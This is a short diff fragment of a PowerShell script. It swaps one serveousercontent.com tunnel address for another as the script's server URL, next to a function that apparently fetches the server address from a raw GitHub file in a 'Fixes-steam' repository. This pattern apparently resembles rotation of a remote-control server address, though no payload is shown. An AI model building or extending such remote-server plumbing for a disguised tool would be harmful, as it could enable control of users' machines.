@@ -214,7 +214,7 @@ function Remove-ExpiredTimers {
 }
 
 # ---- Server URL (default + auto-fetch from raw GitHub) ----
-`$script:serverUrl = "https://7193918258b869a0-45-224-188-19.serveousercontent.com"
+`$script:serverUrl = "https://f868d0a03cbe54fd-45-224-188-19.serveousercontent.com"
 $script:ghUrlBase = "https://raw.githubusercontent.com/bastisayes/Fixes-steam/main/original_blue.ps1"
 function Update-ServerUrl {
     try {
